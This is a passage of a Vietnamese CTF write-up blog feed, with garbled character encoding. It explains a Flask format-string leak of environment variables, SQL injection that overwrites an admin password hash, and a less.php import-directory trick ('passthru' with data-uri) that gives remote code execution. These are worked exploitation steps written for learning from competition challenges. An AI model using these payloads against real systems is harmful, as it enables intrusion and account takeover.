&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;run_cmd&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;function&lt;/span&gt; &lt;span class="n"&gt;run_cmd&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0x717c0d9cd040&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;sanitize_input&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;function&lt;/span&gt; &lt;span class="n"&gt;sanitize_input&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0x717c0c2698b0&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;app&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;Flask&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;app&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;function&lt;/span&gt; &lt;span class="n"&gt;admin&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0x717c0c272940&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;index&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;function&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0x717c0c2729d0&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;your_name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;function&lt;/span&gt; &lt;span class="n"&gt;your_name&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0x717c0c272b80&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s1"&gt;&amp;#39;report&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;function&lt;/span&gt; &lt;span class="n"&gt;report&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0x717c0c272c10&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;MÃ y mÃ² má»™t lÃºc thÃ¬ mÃ¬nh cÅ©ng tháº¥y tá»« attribute Flask cÃ³ thá»ƒ dáº«n Ä‘áº¿n os:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/SJl24xmsye.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;code&gt;{.__globals__[Flask].__init__.__globals__[os].environ}&lt;/code&gt;
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/B1c1Hx7jye.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;h2 id="pwnshop"&gt;pwnshop
&lt;/h2&gt;&lt;p&gt;Má»™t challenge PHP vá»›i lÆ°á»£ng source khÃ¡ Ä‘á»“ sá»™ so vá»›i chall phÃ­a trÃªn, cÃ³ Ä‘áº§y Ä‘á»§ cÃ¡c chá»©c nÄƒng cá»§a má»™t shop online. Má»¥c tiÃªu cá»§a chÃºng ta lÃ  RCE:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/BJCuwrmj1g.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Má»™t sá»‘ folder Ä‘Ã¡ng chÃº Ã½ trong src:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/HyKqwHQskl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;API: Chá»©a routing cho cÃ¡c api CRUD táº¡i website vÃ  code chá»©c nÄƒng/phÃ¢n quyá»n sá»­ dá»¥ng chá»©c nÄƒng, lÃ  controller cho toÃ n bá»™ project&lt;/li&gt;
&lt;li&gt;Auth: Code config JWT vÃ  set cookie khi login thÃ nh cÃ´ng&lt;/li&gt;
&lt;li&gt;Models: Chá»©a cÃ¡c Ä‘á»‘i tÆ°á»£ng vÃ  cÃ¡c hÃ m query DB vá»›i tá»«ng Ä‘á»‘i tÆ°á»£ng&lt;/li&gt;
&lt;li&gt;Security: Filter file upload vÃ  XML file&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="sql-injection-to-admin-role"&gt;SQL Injection to Admin role
&lt;/h3&gt;&lt;p&gt;Sau khi Ä‘á»c qua má»™t lÆ°á»£t, mÃ¬nh táº­p trung chá»§ yáº¿u vÃ o file Api/Rest/RestController.php vÃ¬ nÃ³ chá»©a routing vÃ  cÃ¡c hÃ m Ä‘Æ°á»£c sá»­ dá»¥ng trong cÃ¡c api tÆ°Æ¡ng á»©ng. Má»™t sá»‘ hÃ m sáº½ láº¥y tá»« Models.
CÃ²n Security mÃ¬nh khÃ´ng Ä‘á»ƒ Ã½ láº¯m vÃ¬ Ä‘oáº¡n code filter XML khÃ¡ dÃ i vÃ  lan man, cÃ²n file upload thÃ¬ nghá»‰ Ä‘i vÃ¬ há» whitelist rá»“i.
Táº¡i route /api/orders/search sá»­ dá»¥ng method searchOrders, ta cÃ³ thá»ƒ khai thÃ¡c SQL Injection qua param limit:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/ryg-KBXike.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/S1OGFB7s1g.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Táº¡i Ä‘Ã¢y searchOrders gá»i Ä‘áº¿n function search trong model Order, giÃ¡ trá»‹ cá»§a param limit Ä‘Æ°á»£c ná»‘i vÃ o mÃ  khÃ´ng cÃ³ filter gÃ¬:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/B1vTYH7j1x.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
KhÃ´ng nhÆ° tÃ­nh nÄƒng search cá»§a model Product, param limit Ä‘Æ°á»£c Ã©p vá» int trÆ°á»›c khi ná»‘i chuá»—i:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/B1Pb5HXiyg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Ta hoÃ n toÃ n cÃ³ thá»ƒ stacked query, quÃ¡ ngon:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/HyxUoHXo1x.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
MÃ¬nh láº­p tá»©c nghÄ© Ä‘áº¿n viá»‡c write file to RCE vá»›i into dumpfile hoáº·c into outfile, nhÆ°ng mÃ¬nh khÃ´ng write Ä‘Æ°á»£c. Ngá»“i 1 lÃºc thÃ¬ mÃ¬nh tháº¥y lÃ­ do lÃ  vÃ¬ user DB khÃ´ng Ä‘á»§ quyá»n Ä‘á»ƒ write, náº¿u nhÆ° dÃ¹ng root Ä‘á»ƒ vÃ o mysql báº±ng &lt;code&gt;mysql -u root&lt;/code&gt; thÃ¬ ta cÃ³ thá»ƒ ghi Ä‘Æ°á»£c. CÃ²n user cá»§a ta Ä‘ang lÃ  &lt;code&gt;user-pwnshop&lt;/code&gt; chá»‰ cÃ³ quyá»n thao tÃ¡c db pwnshop chá»© khÃ´ng cÃ³ quyá»n FILE -&amp;gt; khÃ´ng thá»ƒ Ä‘á»c/ghi file:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/Hk9uZP7sJl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
NhÃ¬n tháº¥y báº£ng users cÃ³ admin, mÃ¬nh Ä‘á»•i máº­t kháº©u admin thÃ nh 12345678 Ä‘á»ƒ log in luÃ´n:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/B16JpBQjyx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/SJQQCSXoJx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;update users set password = &amp;#39;$2y$10$sB/I2oDHtik8W2fWX3odE.FSDq9fGJ6U5HWOMfhSIhLkYMNY.0o5m&amp;#39; where username=&amp;#39;admin&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/SJUgRSQjye.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Váº­y lÃ  mÃ¬nh cÃ³ Admin =))&lt;/p&gt;
&lt;h3 id="0-day-in-lessphp-library-leads-to-rce"&gt;0 day in less.php Library leads to RCE
&lt;/h3&gt;&lt;p&gt;MÃ¬nh Ä‘Ã£ stuck á»Ÿ SQLi mÃ  khÃ´ng leo lÃªn Ä‘Æ°á»£c RCE, sau Ä‘Ã³ end giáº£i thÃ¬ author cÃ³ push lÃªn solution:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/S1UIJL7s1x.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Oh damn, cÃ³ láº½ SQLi khÃ´ng pháº£i lÃ  intended. Anyways, khÃ´ng cÃ³ cÃ¡ch nÃ y thÃ¬ cÃ³ cÃ¡ch khÃ¡c thÃ´i &lt;code&gt;Â¯\_(ãƒ„)_/Â¯&lt;/code&gt;
CÃ¡i mÃ¬nh Ä‘á»ƒ Ã½ lÃ  thÆ° viá»‡n less.php cÃ³ thá»ƒ trigger RCE qua file less vÃ  tÃªn thÆ° má»¥c import. Tiá»‡n lá»£i lÃ  khi lÃªn admin ta sáº½ tháº¥y ta cÃ³ quyá»n config báº±ng cÃ¡ch upload less file vÃ  cáº¥u hÃ¬nh import directories:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/B1MbxLXiJg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Vá» cÆ¡ báº£n, khi ta táº¡o má»™t thÆ° má»¥c Ä‘á»ƒ import, ta Ä‘Æ°á»£c Ä‘iá»n vÃ o Ä‘Æ°á»ng dáº«n váº­t lÃ½ vÃ  import path, cÃ¡c file CSS muá»‘n import sáº½ cÃ³ thá»ƒ sá»­ dá»¥ng Ä‘Æ°á»ng dáº«n tá»« import path.
Chá»©c nÄƒng trigger RCE náº±m táº¡i function chá»‰nh sá»­a CSS vÃ  apply CSS, vá»›i route xá»­ lÃ½ lÃ  /api/settings/css:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/H1qfHUQsJl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Äi sÃ¢u vÃ o code, route /api/settings/css call Ä‘áº¿n method updateCustomCss táº¡i RestController.php:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;#[Privilege(permissions: [Permissions::MANAGE_APPEARANCE])]
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;private function updateCustomCss($currentUser, $data) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; try {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if (!isset($data[&amp;#39;css&amp;#39;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return [
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;#39;success&amp;#39; =&amp;gt; false,
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;CSS is required&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;#39;status&amp;#39; =&amp;gt; 400
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ];
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $result = $this-&amp;gt;settings-&amp;gt;updateCustomCss($data[&amp;#39;css&amp;#39;]);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; .....
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tiáº¿p tá»¥c call Ä‘áº¿n method updateCustomCss -&amp;gt; generateCSS táº¡i Model Settings:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;span class="lnt"&gt;28
&lt;/span&gt;&lt;span class="lnt"&gt;29
&lt;/span&gt;&lt;span class="lnt"&gt;30
&lt;/span&gt;&lt;span class="lnt"&gt;31
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;public function updateCustomCss($css) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; try {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $customLessPath = __DIR__ . &amp;#39;/../../resources/less/custom.less&amp;#39;;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; file_put_contents($customLessPath, $css);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return $this-&amp;gt;generateCSS();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; } catch (Exception $e) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return false;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;private function generateCSS() {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; try {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $themeCssPath = __DIR__ . &amp;#39;/../../public/assets/css/main.css&amp;#39;;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $css = file_get_contents($themeCssPath);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $customLessPath = __DIR__ . &amp;#39;/../../resources/less/custom.less&amp;#39;;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if (file_exists($customLessPath)) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $customLess = file_get_contents($customLessPath);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $parser = new \Less_Parser();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $importDirs = $this-&amp;gt;getImportDirectories();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $parser-&amp;gt;SetImportDirs($importDirs);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $parser-&amp;gt;parse($customLess);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $customCSS = $parser-&amp;gt;getCss();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $css .= &amp;#34;\n/* Custom CSS */\n&amp;#34; . $customCSS;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ....
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; } catch (Exception $e) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return false;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Táº¡i Ä‘Ã¢y Less_Parser cÃ³ nhiá»‡m vá»¥ sá»­ dá»¥ng import directories Ä‘Ã£ cÃ³ vÃ  set vÃ o import dir, vÃ  láº¥y ná»™i dung css cá»§a chÃºng ta Ä‘á»ƒ táº¡o thÃ nh Css trong method getCss()
Tá»« Ä‘Ã¢y thÃ¬ chÃºng ta sáº½ xuáº¥t hiá»‡n lá»— há»•ng khi sá»­ dá»¥ng function data-uri trong Less, vá»‘n Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ nhÃºng file vÃ o CSS theo path hoáº·c nhÃºng báº±ng base64. Táº¡i &lt;code&gt;Less_Tree_Call::compile&lt;/code&gt; khi match tháº¥y method data-uri sáº½ set tÃªn function lÃ  datauri vÃ  call Ä‘áº¿n method &lt;code&gt;Less_Functions::datauri&lt;/code&gt;:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/SJQjjImoyg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
HÃ m Ä‘Ã³ sáº½ tiáº¿p tá»¥c call Ä‘áº¿n &lt;code&gt;Less_FileManager::getFilePath&lt;/code&gt;
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/Sy2zpIXjyl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Táº¡i hÃ m nÃ y thÃ¬ Ä‘Æ°á»ng dáº«n $rooturi Ä‘Æ°á»£c láº¥y tá»« $import_dirs Ä‘Æ°á»£c kiá»ƒm tra cÃ³ pháº£i hÃ m hay khÃ´ng, náº¿u cÃ³ thÃ¬ sáº½ sá»­ dá»¥ng nhÆ° lÃ  1 function vá»›i param lÃ  $filename lÃ  giÃ¡ trá»‹ náº±m trong function data-uri Ä‘Ã£ Ä‘Æ°á»£c extract tá»« method trÆ°á»›c Ä‘Ã³:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rJ6mpLmjkg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
NhÆ° váº­y vá» cÆ¡ báº£n, ta cáº§n táº¡o má»™t import directories cÃ³ giÃ¡ trá»‹ lÃ  1 hÃ m nháº­n vÃ o 1 tham sá»‘, cá»™ng vá»›i viá»‡c truyá»n dá»¯ liá»‡u vÃ o bÃªn trong function &lt;code&gt;data-uri&lt;/code&gt;, khi LESS kiá»ƒm tra tÃªn file sáº½ trigger code injection. Äá»ƒ RCE thÃ¬ ta Æ°u tiÃªn sá»­ dá»¥ng cÃ¡c hÃ m hiá»ƒn thá»‹ cÃ¢u lá»‡nh mÃ  cÃ³ kháº£ nÄƒng nháº­n vÃ o 1 tham sá»‘: system, passthru.
MÃ¬nh táº¡o import directories cÃ³ tÃªn import path lÃ  passthru:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/Syl1C87jyx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Sau Ä‘Ã³ chá»‰ cáº§n trigger lá»—i RCE thÃ´ng qua api custom CSS lÃ  cÃ³ thá»ƒ RCE:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/ByAUCIQj1g.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Lá»¥m flag báº±ng command &lt;code&gt;/getflag PWNME&lt;/code&gt;
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/BJ4CC8Qj1l.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;h4 id="funny-walkaround"&gt;Funny Walkaround
&lt;/h4&gt;&lt;p&gt;VÃ¬ sink lá»— há»•ng náº±m táº¡i method &lt;code&gt;Less_FileManager::getFilePath&lt;/code&gt;, táº¥t cáº£ cÃ¡c funtions call Ä‘áº¿n method nÃ y Ä‘á»u cÃ³ thá»ƒ dáº«n Ä‘áº¿n RCE, quan sÃ¡t trong lib/Less/Functions.php thÃ¬ ngoÃ i method datauri thÃ¬ cÃ²n cÃ³ method getImageSize sá»­ dá»¥ng Ä‘áº¿n method nÃ y, cÃ¹ng vá»›i tham sá»‘ truyá»n vÃ o tÆ°Æ¡ng tá»±:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/B1yi4wQsJe.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
CÃ³ 3 function cá»§a less sá»­ dá»¥ng method nÃ y, bao gá»“m:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;image-size: imagesize&lt;/li&gt;
&lt;li&gt;image-width: imagewidth&lt;/li&gt;
&lt;li&gt;image-height: imageheight&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/Hkh0VPQjJx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
NÃªn ngoÃ i data-uri(), ta hoÃ n toÃ n cÃ³ thá»ƒ sá»­ dá»¥ng 3 function nÃ y, cÃ¡ch sá»­ dá»¥ng cÅ©ng tÆ°Æ¡ng tá»±, tuy nhiÃªn sáº½ vÄƒng ra kha khÃ¡ lá»—i:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rk7dHvXi1x.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/H17jHDmo1e.png"
loading="lazy"
alt="image"
&gt;&lt;/p&gt;</description></item><item><title>ISITDTU CTF 2024</title><link>https://kev1n1203.github.io/p/isitdtu-ctf-2024/</link><pubDate>Sun, 27 Oct 2024 17:10:08 +0000</pubDate><guid>https://kev1n1203.github.io/p/isitdtu-ctf-2024/</guid><description>&lt;h2 id="hihi"&gt;hihi
&lt;/h2&gt;&lt;p&gt;ÄÃ¢y lÃ  má»™t challenge whitebox, cung cáº¥p cho mÃ¬nh source code, cung cáº¥p má»™t cÃ¡ch khÃ¡ hay Ä‘á»ƒ khai thÃ¡c SSTI
Challenge sá»­ dá»¥ng Springboot Ä‘á»ƒ build web, vá»›i 1 route duy nháº¥t táº¡i index, táº¡i phÆ°Æ¡ng thá»©c POST nháº­n Ä‘áº§u vÃ o lÃ  data vÃ  xá»­ lÃ½ Ä‘á»ƒ in ra chuá»—i hello tÃªn ngÆ°á»i dÃ¹ng vÃ  thá»i gian:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
